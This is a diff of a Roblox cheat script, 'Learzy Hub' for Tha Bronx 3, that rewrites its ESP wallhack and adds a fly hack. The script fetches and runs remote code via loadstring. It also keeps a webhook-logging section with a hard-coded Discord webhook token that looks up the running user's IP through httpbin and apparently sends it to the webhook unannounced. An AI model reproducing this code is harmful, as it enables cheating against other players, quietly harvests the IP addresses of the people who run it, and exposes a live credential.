@@ -1,5 +1,6 @@
 -- === Load Rayfield UI ===
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
 local Window = Rayfield:CreateWindow({
     Name = "Learzy Hub | Tha Bronx 3",
     Icon = 0,
@@ -14,7 +15,7 @@ local Window = Rayfield:CreateWindow({
     KeySettings = { SaveKey = true, Key = {"Hello"} }
 })
 
--- === Webhook Logging (as previously) ===
+-- === Webhook Logging ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -25,8 +26,8 @@ local function fetchIP()
     if not request then return "Unavailable" end
     local res = request({Url = "https://httpbin.org/ip", Method = "GET"})
     if res and res.Body then
-        local ok, d = pcall(function() return HttpService:JSONDecode(res.Body) end)
-        if ok and d and d.origin then return d.origin end
+        local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+        if ok and data and data.origin then return data.origin end
     end
     return "Unavailable"
 end
@@ -61,134 +62,208 @@ end
 
 sendWebhook()
 
--- === ESP Setup ===
+-- === ESP ===
 local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
+local DrawingESP = {}
 local ESP_Toggles = { Box = false, Health = false, Tool = false, Name = false }
-local DrawingESP = {}  -- maps player → structure { Box, Health, Tool, Name }
 
--- Drawing factory functions remain as before
-local function createBox() local box = Drawing.new("Square"); box.Color = Color3.new(1,1,1); box.Thickness=1; box.Filled=false; box.Visible=false; return box end
-local function createBar() local bar = Drawing.new("Square"); bar.Filled=true; bar.Visible=false; bar.Thickness=0; return bar end
-local function createText() local txt = Drawing.new("Text"); txt.Size=14; txt.Center=true; txt.Outline=true; txt.OutlineColor=Color3.new(0,0,0); txt.Font=2; txt.Visible=false; return txt end
+local function createBox() local b = Drawing.new("Square"); b.Filled=false; b.Color=Color3.new(1,1,1); b.Thickness=1; b.Visible=false; return b end
+local function createBar() local b = Drawing.new("Square"); b.Filled=true; b.Visible=false; b.Thickness=0; return b end
+local function createText()
+    local t = Drawing.new("Text")
+    t.Size = 14
+    t.Center = true
+    t.Outline = true
+    t.OutlineColor = Color3.new(0,0,0)
+    t.Font = 2
+    t.Visible = false
+    return t
+end
 
--- Clears a single player's drawings
-local function clearForPlayer(pl)
-    local data = DrawingESP[pl]
-    if data then
-        for _, obj in pairs(data) do
-            if obj and obj.Visible ~= nil then
-                obj:Remove()
-            end
+local function clearPlayerESP(player)
+    if DrawingESP[player] then
+        for _, obj in pairs(DrawingESP[player]) do
+            if obj.Remove then obj:Remove() end
         end
-        DrawingESP[pl] = nil
+        DrawingESP[player] = nil
     end
 end
 
--- Setup observers for a player
-local function watchCharacter(pl)
-    pl.CharacterAdded:Connect(function(char)
+local function setupCharacterESP(player)
+    player.CharacterAdded:Connect(function()
         task.wait(0.5)
-        clearForPlayer(pl)
-        if not char:FindFirstChild("Humanoid") or not char:FindFirstChild("HumanoidRootPart") then return end
-        local data = {
+        clearPlayerESP(player)
+        DrawingESP[player] = {
             Box = createBox(),
             Health = createBar(),
             Tool = createText(),
             Name = createText()
         }
-        DrawingESP[pl] = data
     end)
-end
-
--- Installs watchers for all players (including LocalPlayer for cleanup)
-local function initPlayerListeners()
-    for _, pl in ipairs(Players:GetPlayers()) do
-        watchCharacter(pl)
+    if player.Character then
+        DrawingESP[player] = {
+            Box = createBox(),
+            Health = createBar(),
+            Tool = createText(),
+            Name = createText()
+        }
     end
-    Players.PlayerAdded:Connect(function(pl)
-        watchCharacter(pl)
-    end)
-    Players.PlayerRemoving:Connect(function(pl)
-        clearForPlayer(pl)
-    end)
 end
 
--- Main updater loop
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then setupCharacterESP(p) end
+end
+
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LocalPlayer then setupCharacterESP(p) end
+end)
+
+Players.PlayerRemoving:Connect(function(p)
+    clearPlayerESP(p)
+end)
+
 RunService.RenderStepped:Connect(function()
-    for pl, data in pairs(DrawingESP) do
-        if pl ~= LocalPlayer and ESP_Toggles.Box or ESP_Toggles.Health or ESP_Toggles.Tool or ESP_Toggles.Name then
-            local char = pl.Character
-            if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
-                local hum = char.Humanoid
-                local root = char.HumanoidRootPart
-                local cf = root.CFrame
-                local _, onScreen = Camera:WorldToViewportPoint(root.Position)
-                if onScreen and hum.Health > 0 then
-                    -- Compute bounding box
-                    local size = Vector3.new(2,3,1.5) * 1.5
-                    local pts = {}
-                    for x=-1,1,2 do for y=-1,1,2 do for z=-1,1,2 do
-                        table.insert(pts, Camera:WorldToViewportPoint(cf.Position + Vector3.new(x,y,z)*(size/2)))
-                    end end end
-                    local minX, minY, maxX, maxY = math.huge, math.huge, -math.huge, -math.huge
-                    for _, p in ipairs(pts) do
-                        minX = math.min(minX,p.X); minY = math.min(minY,p.Y)
-                        maxX = math.max(maxX,p.X); maxY = math.max(maxY,p.Y)
-                    end
-                    -- Box
-                    if ESP_Toggles.Box then
-                        data.Box.Position = Vector2.new(minX, minY)
-                        data.Box.Size = Vector2.new(maxX-minX, maxY-minY)
-                        data.Box.Visible = true
-                    else
-                        data.Box.Visible = false
-                    end
-                    -- Health bar
-                    if ESP_Toggles.Health then
-                        local ratio = math.clamp(hum.Health/hum.MaxHealth, 0, 1)
-                        data.Health.Size = Vector2.new(4, (maxY-minY)*ratio)
-                        data.Health.Position = Vector2.new(minX-6, minY + ((maxY-minY)*(1-ratio)))
-                        data.Health.Color = ratio > 0.5 and Color3.fromRGB(0,255,0) or ratio > 0.2 and Color3.fromRGB(255,255,0) or Color3.fromRGB(255,0,0)
-                        data.Health.Visible = true
-                    else
-                        data.Health.Visible = false
-                    end
-                    -- Tool Name
-                    if ESP_Toggles.Tool then
-                        local held = char:FindFirstChildOfClass("Tool")
-                        data.Tool.Text = held and held.Name or ""
-                        data.Tool.Position = Vector2.new((minX+maxX)/2, maxY + 16)
-                        data.Tool.Color = Color3.fromRGB(255,255,0)
-                        data.Tool.Visible = held ~= nil
-                    else
-                        data.Tool.Visible = false
-                    end
-                    -- Username
-                    if ESP_Toggles.Name then
-                        data.Name.Text = pl.Name
-                        data.Name.Position = Vector2.new((minX+maxX)/2, minY - 16)
-                        data.Name.Color = Color3.fromRGB(255,255,255)
-                        data.Name.Visible = true
-                    else
-                        data.Name.Visible = false
-                    end
-                else
-                    for _, obj in pairs(data) do
-                        obj.Visible = false
-                    end
+    for player, data in pairs(DrawingESP) do
+        local char = player.Character
+        if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("Humanoid") then
+            local hrp = char.HumanoidRootPart
+            local hum = char.Humanoid
+            local _, onScreen = Camera:WorldToViewportPoint(hrp.Position)
+            if onScreen and hum.Health > 0 then
+                local size = Vector3.new(2, 3, 1.5) * 1.5
+                local points = {}
+                for x=-1,1,2 do for y=-1,1,2 do for z=-1,1,2 do
+                    table.insert(points, Camera:WorldToViewportPoint(hrp.Position + Vector3.new(x,y,z)*(size/2)))
+                end end end
+                local minX, minY = math.huge, math.huge
+                local maxX, maxY = -math.huge, -math.huge
+                for _, p in ipairs(points) do
+                    minX = math.min(minX,p.X) minY = math.min(minY,p.Y)
+                    maxX = math.max(maxX,p.X) maxY = math.max(maxY,p.Y)
                 end
+                -- 2D Box
+                if ESP_Toggles.Box then
+                    data.Box.Position = Vector2.new(minX, minY)
+                    data.Box.Size = Vector2.new(maxX - minX, maxY - minY)
+                    data.Box.Visible = true
+                else data.Box.Visible = false end
+                -- Health Bar
+                if ESP_Toggles.Health then
+                    local ratio = math.clamp(hum.Health/hum.MaxHealth,0,1)
+                    data.Health.Size = Vector2.new(4, (maxY - minY)*ratio)
+                    data.Health.Position = Vector2.new(minX - 6, minY + (maxY - minY)*(1-ratio))
+                    data.Health.Color = ratio > 0.5 and Color3.fromRGB(0,255,0) or ratio > 0.2 and Color3.fromRGB(255,255,0) or Color3.fromRGB(255,0,0)
+                    data.Health.Visible = true
+                else data.Health.Visible = false end
+                -- Tool
+                if ESP_Toggles.Tool then
+                    local tool = char:FindFirstChildOfClass("Tool")
+                    data.Tool.Text = tool and tool.Name or ""
+                    data.Tool.Position = Vector2.new((minX+maxX)/2, maxY + 16)
+                    data.Tool.Color = Color3.fromRGB(255,255,0)
+                    data.Tool.Visible = tool ~= nil
+                else data.Tool.Visible = false end
+                -- Username
+                if ESP_Toggles.Name then
+                    data.Name.Text = player.Name
+                    data.Name.Position = Vector2.new((minX+maxX)/2, minY - 16)
+                    data.Name.Color = Color3.fromRGB(255,255,255)
+                    data.Name.Visible = true
+                else data.Name.Visible = false end
+            else
+                for _, obj in pairs(data) do obj.Visible = false end
             end
         end
     end
 end)
 
--- Initialize players and respawn tracking
-initPlayerListeners()
-
--- === UI: ESP Tab with split toggles ===
+-- === UI: ESP ===
 local Tab = Window:CreateTab("ESP", 4483362458)
-Tab:CreateToggle({ Name = "2D Box", CurrentValue = false, Callback = function(v) ESP_Toggles.Box = v; if not v then clearForPlayer(LocalPlayer) end end })
-Tab:CreateToggle({ Name = "Health Bar", CurrentValue = false, Callback = function(v) ESP_Toggles.Health = v; if not v then clearForPlayer(LocalPlayer) end end })
-Tab:CreateToggle({ Name = "Tool Name", CurrentValue = false, Callback = function(v) ESP_Toggles.Tool = v; if not v then clearForPlayer(LocalPlayer) end end })
-Tab:CreateToggle({ Name = "Username", CurrentValue = false, Callback = function(v) ESP_Toggles.Name = v; if not v then clearForPlayer(LocalPlayer) end end })
+Tab:CreateToggle({ Name = "2D Box", CurrentValue = false, Callback = function(v) ESP_Toggles.Box = v end })
+Tab:CreateToggle({ Name = "Health Bar", CurrentValue = false, Callback = function(v) ESP_Toggles.Health = v end })
+Tab:CreateToggle({ Name = "Tool Name", CurrentValue = false, Callback = function(v) ESP_Toggles.Tool = v end })
+Tab:CreateToggle({ Name = "Username", CurrentValue = false, Callback = function(v) ESP_Toggles.Name = v end })
+
+-- === Fly System ===
+local UIS = game:GetService("UserInputService")
+local flying = false
+local flySpeed = 60
+local control = {F=0, B=0, L=0, R=0, U=0, D=0}
+local flyVelocity, flyConn = nil, nil
+
+UIS.InputBegan:Connect(function(i,gpe)
+    if gpe then return end
+    if i.KeyCode == Enum.KeyCode.W then control.F = 1 end
+    if i.KeyCode == Enum.KeyCode.S then control.B = 1 end
+    if i.KeyCode == Enum.KeyCode.A then control.L = 1 end
+    if i.KeyCode == Enum.KeyCode.D then control.R = 1 end
+    if i.KeyCode == Enum.KeyCode.Space then control.U = 1 end
+    if i.KeyCode == Enum.KeyCode.LeftControl then control.D = 1 end
+end)
+UIS.InputEnded:Connect(function(i)
+    if i.KeyCode == Enum.KeyCode.W then control.F = 0 end
+    if i.KeyCode == Enum.KeyCode.S then control.B = 0 end
+    if i.KeyCode == Enum.KeyCode.A then control.L = 0 end
+    if i.KeyCode == Enum.KeyCode.D then control.R = 0 end
+    if i.KeyCode == Enum.KeyCode.Space then control.U = 0 end
+    if i.KeyCode == Enum.KeyCode.LeftControl then control.D = 0 end
+end)
+
+local function startFly()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    flyVelocity = Instance.new("BodyVelocity")
+    flyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
+    flyVelocity.Velocity = Vector3.zero
+    flyVelocity.P = 1250
+    flyVelocity.Parent = hrp
+
+    local hum = char:FindFirstChild("Humanoid")
+    if hum then
+        hum.PlatformStand = false
+        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+        for _, s in pairs(Enum.HumanoidStateType:GetEnumItems()) do
+            pcall(function() hum:SetStateEnabled(s, true) end)
+        end
+    end
+
+    flyConn = RunService.RenderStepped:Connect(function()
+        if not flying then return end
+        local dir = Vector3.zero
+        local cam = workspace.CurrentCamera
+        dir += cam.CFrame.LookVector * (control.F - control.B)
+        dir += cam.CFrame.RightVector * (control.R - control.L)
+        dir += cam.CFrame.UpVector * (control.U - control.D)
+        if dir.Magnitude > 0 then
+            flyVelocity.Velocity = dir.Unit * flySpeed
+        else
+            flyVelocity.Velocity = Vector3.zero
+        end
+    end)
+end
+
+local function stopFly()
+    if flyConn then flyConn:Disconnect() end
+    if flyVelocity then flyVelocity:Destroy() end
+end
+
+-- === UI: Movement ===
+local FlyTab = Window:CreateTab("Movement", 4483362458)
+FlyTab:CreateToggle({
+    Name = "Fly",
+    CurrentValue = false,
+    Callback = function(state)
+        flying = state
+        if state then startFly() else stopFly() end
+    end
+})
+FlyTab:CreateSlider({
+    Name = "Fly Speed",
+    Range = {10, 150},
+    Increment = 5,
+    CurrentValue = flySpeed,
+    Suffix = " studs/s",
+    Callback = function(v) flySpeed = v end
+})
